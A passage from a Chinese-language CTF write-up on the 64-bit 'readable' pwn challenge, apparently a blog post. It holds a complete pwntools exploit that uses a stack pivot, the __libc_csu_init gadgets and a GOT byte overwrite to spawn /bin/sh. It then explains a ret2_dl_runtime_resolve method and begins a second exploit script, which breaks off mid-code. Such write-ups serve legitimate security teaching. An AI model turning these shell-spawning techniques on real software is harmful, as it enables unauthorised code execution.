class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;execve函数</span></span><br><span class="line">&lt;execve+n&gt;    <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x3b</span></span><br><span class="line">&lt;execve+(n+<span class="number">5</span>)&gt; <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure></p><ul><li>2、如果知道了<code>read函数</code>中<code>syscall</code>距离<code>read函数起始位置</code>的<code>偏移</code>，那么直接将<code>read的GOT表内容</code>的<code>最后一个字节</code>修改为<code>此偏移</code>，同时通过<code>read函数</code>读取<code>系统调用号长度</code>的内容，使<code>eax</code>修改为<code>系统调用号</code>。这样，<code>调用read函数</code>的时候就相当于执行<code>其他系统调用</code>了。<code>爆破syscall偏移</code>的时候利用<code>write函数</code>进行<code>打印测试</code>，如果能够<code>正常打印</code>，则说明爆破出的<code>syscall偏移</code>是<code>正确的</code>，否则程序读取不到相关信息。</li></ul><p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary = <span class="string">'./readable'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x600910</span></span><br><span class="line">buff_addr = bss_addr + <span class="number">0x20</span></span><br><span class="line">main_addr = <span class="number">0x400505</span></span><br><span class="line">head_addr = <span class="number">0x400000</span></span><br><span class="line">set_args_addr = <span class="number">0x40058A</span><span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">call_func_addr = <span class="number">0x400570</span><span class="comment">#__libc_csu_init中的通用gadget</span></span><br><span class="line">read_got = <span class="number">0x6008E8</span></span><br><span class="line">leave_ret = <span class="number">0x400520</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'52.68.53.28'</span>,<span class="number">56746</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./readable'</span>)</span><br><span class="line">        <span class="comment"># io = gdb.debug('./readable','bp 0x400579')# get_syscall_dis()</span></span><br><span class="line">        io = gdb.debug(<span class="string">'./readable'</span>,<span class="string">'''bp 0x4004FD</span></span><br><span class="line"><span class="string">                                       bp 0x40051B'''</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_syscall_addr</span><span class="params">(io,dis)</span>:</span></span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p64(set_args_addr)</span><br><span class="line">    <span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    shellcode += p64(<span class="number">0x0</span>) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x0</span>)</span><br><span class="line">    <span class="comment"># rdi = r15 = 0,rsi = r14 = read_got,rdx = r13 = 0x01,call(r12+rbx*8) = call(read_got+0*8)</span></span><br><span class="line">    <span class="comment"># read(0,read_got,1)  rax存储返回值，read()成功,则返回读取的字节数,这将rax设置为了0x01</span></span><br><span class="line">    shellcode += p64(call_func_addr)</span><br><span class="line">    shellcode += <span class="string">'A'</span> * <span class="number">8</span><span class="comment"># 0x400586  add rsp, 8</span></span><br><span class="line">    <span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    shellcode += p64(<span class="number">0x0</span>) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x04</span>) + p64(head_addr) + p64(<span class="number">0x01</span>)</span><br><span class="line">    <span class="comment"># rdi = r15 = 0x01,rsi = r14 = head_addr,rdx = r13 = 0x04,call(r12+rbx*8) = call(read_got+0*8)</span></span><br><span class="line">    <span class="comment"># write(1,head_addr,4),若dis成功将read_got指向syscall，则执行write()</span></span><br><span class="line">    shellcode += p64(call_func_addr)</span><br><span class="line">    length = len(shellcode)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"shellcode length:"</span> + str(length)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        length += <span class="number">16</span> - length % <span class="number">16</span></span><br><span class="line">    payload = shellcode.ljust(length,<span class="string">'\x90'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload length:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length,<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># buf,rbp,ret_address</span></span><br><span class="line">        io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr + <span class="number">0x10</span> + i) + p64(main_addr))</span><br><span class="line">        <span class="comment"># buf,rbp,ret_address</span></span><br><span class="line">        io.send(payload[i:i+<span class="number">16</span>] + p64(bss_addr + <span class="number">0x10</span>) + p64(main_addr))</span><br><span class="line">    io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr - <span class="number">0x08</span>) + p64(leave_ret))</span><br><span class="line">    <span class="comment"># raw_input('before send dis')</span></span><br><span class="line">    io.send(chr(dis))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"dis:"</span>,hex(dis)</span><br><span class="line">    <span class="comment"># raw_input('before receive data')</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = io.recv(<span class="number">4</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">print</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">'\x7FELF'</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[*]Find the offset of syscall in read() function :"</span>,hex(dis)</span><br><span class="line">            raw_input()</span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_syscall_dis</span><span class="params">()</span>:</span></span><br><span class="line">    dis = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> dis <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x100</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = get_io()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"-------------------Start-----------------------"</span></span><br><span class="line">            brute_syscall_addr(io,dis)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"--------------------End------------------------\n"</span></span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io,dis)</span>:</span></span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p64(set_args_addr)</span><br><span class="line">    <span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    shellcode += p64(<span class="number">0x0</span>) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x3b</span>) + p64(read_got - <span class="number">0x3b</span> + <span class="number">1</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">    <span class="comment"># rdi = r15 = 0,rsi = r14 = (read_got-0x3a),rdx = r13 = 0x3b,call(r12+rbx*8) = call(read_got+0*8)</span></span><br><span class="line">    <span class="comment"># read(0,read_got-0x3a,3b)  rax存储返回值，read()成功,则返回读取的字节数,这将rax设置为了0x3b</span></span><br><span class="line">    shellcode += p64(call_func_addr)</span><br><span class="line">    shellcode += <span class="string">'A'</span> * <span class="number">8</span><span class="comment"># 0x400586  add rsp, 8</span></span><br><span class="line">    <span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    shellcode += p64(<span class="number">0x0</span>) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x0</span>) + p64(bss_addr)</span><br><span class="line">    <span class="comment"># rdi = r15 = bss_addr("/bin/sh"),rsi = r14 = 0,rdx = r13 = 0,call(r12+rbx*8) = call(read_got+0*8)</span></span><br><span class="line">    <span class="comment"># execvl("/bin/sh",0,0)</span></span><br><span class="line">    shellcode += p64(call_func_addr)</span><br><span class="line">    length = len(shellcode)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"shellcode length:"</span> + str(length)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        length += <span class="number">16</span> - length % <span class="number">16</span></span><br><span class="line">    payload = shellcode.ljust(length,<span class="string">'\x90'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload length:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length,<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 'A'*0x10---RBP---ret_addr  buffer的地址使用RBP-0x10算出，shellcode从0x600930(bss_addr+0x20)开始存储</span></span><br><span class="line">        <span class="comment"># raw_input('---------[%d] Adjust buffer address---------'%i)</span></span><br><span class="line">        io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr + <span class="number">0x10</span> + i) + p64(main_addr))</span><br><span class="line">        <span class="comment"># raw_input('-------------[%d] Send payload-------------'%i)</span></span><br><span class="line">        io.send(payload[i:i+<span class="number">16</span>] + p64(bss_addr + <span class="number">0x10</span>) + p64(main_addr)) <span class="comment">#bss段前0x20字节用于调整buffer地址</span></span><br><span class="line">    padding = <span class="string">"/bin/sh"</span>.ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    <span class="comment"># raw_input('-------------Send "/bin/sh"-------------')</span></span><br><span class="line">    io.send(padding + p64(buff_addr - <span class="number">0x08</span>) + p64(leave_ret))<span class="comment">#发送"/bin/sh",设置rsp指向shellcode,并跳转到shellcode执行</span></span><br><span class="line">    io.send(<span class="string">'A'</span>*(<span class="number">0x3b</span><span class="number">-1</span>) + chr(dis))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># get_syscall_dis()</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    dis = <span class="number">0x1e</span> <span class="comment"># or 0x3b</span></span><br><span class="line">    pwn(io,dis)</span><br></pre></td></tr></table></figure></p><h4 id="4、方法二：使用ret2-dl-runtime-resolve方式进行利用"><a href="#4、方法二：使用ret2-dl-runtime-resolve方式进行利用" class="headerlink" title="4、方法二：使用ret2_dl_runtime_resolve方式进行利用"></a>4、方法二：使用ret2_dl_runtime_resolve方式进行利用</h4><p><strong><code>利用思路：</code></strong></p><ul><li>1、构造<strong><code>fake_reloc_data</code></strong>、<strong><code>fake_sym_data</code></strong>、<strong><code>func_name</code></strong>、<strong><code>binsh_str</code></strong>、<strong><code>shellcode</code></strong>数据，并写入到合适的位置。计算<code>数据写入地址</code>时，需要注意一些情况。一般情况，这些数据都会写入到<code>.bss段之后</code>的位置。<code>x64情况</code>下，在<strong><code>_dl_runtime_resolve()</code></strong>函数和<strong><code>_dl_fixup()</code></strong>函数中，程序会通过<code>rsp</code>保存<code>寄存器数据</code>到栈上和修改<code>栈上的数据</code>，并且<code>范围较大</code>。由于此程序在通过<code>read()函数</code>多次读入数据时，修改了<code>rbp</code>，使得<code>rbp</code>和<code>rsp</code>都指向<code>.bss段之后的地址</code>。我们在进入<strong><code>符号解析函数</code></strong>时，解析函数会<code>减小rsp</code>，用于<code>存储寄存器数据</code>，并且会将<code>栈上的一些数据清零</code>。这会导致<code>.bss段之前段</code>的数据<code>被修改</code>，造成<code>无法解析</code>system函数的地址。所以我们需要在<code>shellcode写入地址前</code>留够一定的空间，供<code>符号解析函数</code>使用。而<code>fake_reloc_data</code>、<code>fake_sym_data</code>、<code>func_name</code>、<code>binsh_str</code>等数据一般写在<code>shellcode之后</code>的位置。</li></ul><p>&emsp;&emsp;下面是<strong><code>_dl_runtime_resolve()</code></strong>函数和<strong><code>_dl_fixup()</code></strong>函数中<code>对rsp和rbp修改</code>，以及<code>利用rsp和rbp</code>修改<code>栈上数据</code>的代码片段：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve():</span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F14 <span class="keyword">and</span>     <span class="built_in">rsp</span>, <span class="number">0FFFFFFFFFFFFFFC0h</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F18 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="built_in">cs</span>:qword_7F3989066D50(<span class="number">0x3C0</span>)</span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F1F <span class="keyword">mov</span>     [<span class="built_in">rsp</span>], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F23 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">8</span>], <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F28 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">10h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F2D <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">18h</span>], <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F32 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">20h</span>], <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F37 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">28h</span>], <span class="built_in">r8</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F3C <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">30h</span>], <span class="built_in">r9</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F41 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0EEh</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F46 <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F48 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">250h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F50 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">258h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F58 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">260h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F60 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">268h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F68 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">270h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F70 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">278h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F78 xsavec  <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">40h</span>]</span><br><span class="line"></span><br><span class="line">_dl_fixup():</span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E50A3A <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">10h</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E50C10 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">78h</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E51203 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">38h</span></span><br></pre></td></tr></table></figure></p><ul><li>2、将<code>fake数据</code>写入到<code>指定地址</code>后，还需要修改<code>.dynamic段</code>中<code>DT_VERSYM动态段类型</code>所对应的<code>动态段表项</code>中的<code>vernum表的地址</code>，使得<code>ndx = vernum + sym_index*2</code>地址处的<code>ndx值</code>为合理值。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># modify versym dynamic addr(.gnu.version) </span></span><br><span class="line"><span class="comment"># DT_VERSYM(0x40031E) - sym_index(0x155E2)*2 = 0x3D575A or 0x6006F0 - sym_index(0x155E2)*2 = 0x5D5B2C</span></span><br><span class="line"><span class="comment"># raw_input('---------[1] Before modify versym dynamic address---------')</span></span><br><span class="line">write_data_to_address(<span class="number">0x600858</span>,p64(<span class="number">0x6FFFFFF0</span>) + p64(<span class="number">0x3D575A</span>)) <span class="comment"># versym + sym_index*2 可被访问</span></span><br></pre></td></tr></table></figure><ul><li>3、构造<code>shellcode</code>，首先将<code>“/bin/sh”的地址</code>存入<code>rdi寄存器</code>，然后返回到<code>PLT0</code>处的代码，传入<code>system重定位项</code>在<code>重定位表</code>中的<code>下标</code>，利用<code>符号解析函数</code>，计算<code>system函数的地址</code>。解析完system函数的地址后，就会调用<strong><code>system(&quot;/bin/sh&quot;)</code></strong>。从而获取shell。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += p64(p_rdi_ret) + p64(binsh_str_addr)<span class="comment"># "/bin/sh"</span></span><br><span class="line">shellcode += p64(PLT0) + p64(reloc_index)</span><br><span class="line">write_data_to_address(buff_addr,shellcode)</span><br></pre></td></tr></table></figure><ul><li>4、向内存中<code>写入shellcode后</code>，还需要写入一段数据，用于<code>调整rsp</code>，使程序<code>跳转到shellcode</code>执行。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># buf--rbp--ret_address</span></span><br><span class="line">io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr - <span class="number">0x8</span>) + p64(leave_ret))</span><br></pre></td></tr></table></figure><p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># x64</span></span><br><span class="line"><span class="comment"># Elf64_Rel *reloc = JMPREL + reloc_index*3*8</span></span><br><span class="line"><span class="comment"># Elf64_Sym *sym = &amp;SYMTAB[(reloc-&gt;r_info)&gt;&gt;0x20]</span></span><br><span class="line"><span class="comment"># i.e.  *sym = DT_SYMTAB + [(reloc-&gt;r_info)&gt;&gt;0x20]*3*8</span></span><br><span class="line"><span class="comment"># assert(((reloc-&gt;r_info)&amp;0xFFFFFFFF) == 0x7) type</span></span><br><span class="line"><span class="comment"># if((sym-&gt;st_other)&amp;3 == 0) if not resolved</span></span><br><span class="line"><span class="comment"># uint16_t ndx = VERSYM[(reloc-&gt;r_info)&gt;&gt;0x20]</span></span><br><span class="line"><span class="comment"># r_found_version *version = &amp;l-&gt;l_version[ndx]</span></span><br><span class="line"><span class="comment"># name = STRTAB + sym-&gt;st_name</span></span><br><span class="line"><span class="comment"># modify ret_addr = PLT0、the first arg = reloc_index、rdi = addr("/bin/sh")</span></span><br><span class="line"><span class="comment"># modify (jmprel + reloc_index*3*8) &lt;== fake_reloc_data</span></span><br><span class="line"><span class="comment"># modify (symtab + [(reloc-&gt;r_info)&gt;&gt;0x20]*3*8) &lt;== fake_sym_data</span></span><br><span class="line"><span class="comment"># modify (strtab + sym-&gt;st_name) &lt;== 'system\x00'</span></span><br><span class="line"><span class="comment"># modify (link_map + 0x1c8 == 0) or (versym + sym_index*2 可被访问)#第2点在64位系统中很难满足，第1点需要泄露link_map的值。</span></span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./readable'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'52.68.53.28'</span>,<span class="number">56746</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./readable'</span>)</span><br><span class="line">        <span class="comment"># io = gdb.debug('./readable','''bp 0x4004FD</span></span><br><span class="line">        <span class="comment">#                                bp 0x40051B''')</span></span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf64_Addr r_offset; /* 表示重定位所作用的虚拟地址或相对基地址的偏移 */ 8byte</span></span><br><span class="line"><span class="string">    Elf64_Xword r_info;  /* 重定位类型和符号表下标 */ 8byte</span></span><br><span class="line"><span class="string">    Elf64_Sxword r_addend; /* Addend */ 8byte</span></span><br><span class="line"><span class="string">&#125; Elf64_Rela;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x64_reloc_data</span><span class="params">(sym_index,got_plt)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p64(got_plt) + p64((sym_index&lt;&lt;<span class="number">0x20</span>) + <span class="number">0x07</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf64_Word    st_name;  /* 符号名，符号在字符串表中的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    unsigned char st_info;  /* 符号类型及绑定属性 */ 1byte</span></span><br><span class="line"><span class="string">  